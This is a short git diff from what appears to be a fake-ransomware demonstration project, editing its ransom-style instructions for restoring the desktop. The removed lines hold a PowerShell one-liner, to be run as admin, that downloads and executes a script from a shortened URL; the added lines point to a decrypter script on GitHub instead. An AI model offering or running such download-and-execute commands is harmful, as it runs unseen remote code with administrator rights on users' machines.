@@ -16,7 +16,5 @@ Next, find the decrypt software on your desktop, an executable file named "decry
 ############################################################################
 ############################################################################
 
-
-To restore your desktop as before, run powershell as admin and execute this full line: 
-iex ((New-Object System.Net.WebClient).DownloadString('https://tinyurl.com/mr226kw3'))
-
+To quickly restore your Desktop, go to the decrypter script:
+https://github.com/Andreas6920/FakeRansomware/blob/main/resources/decrypter.ps1
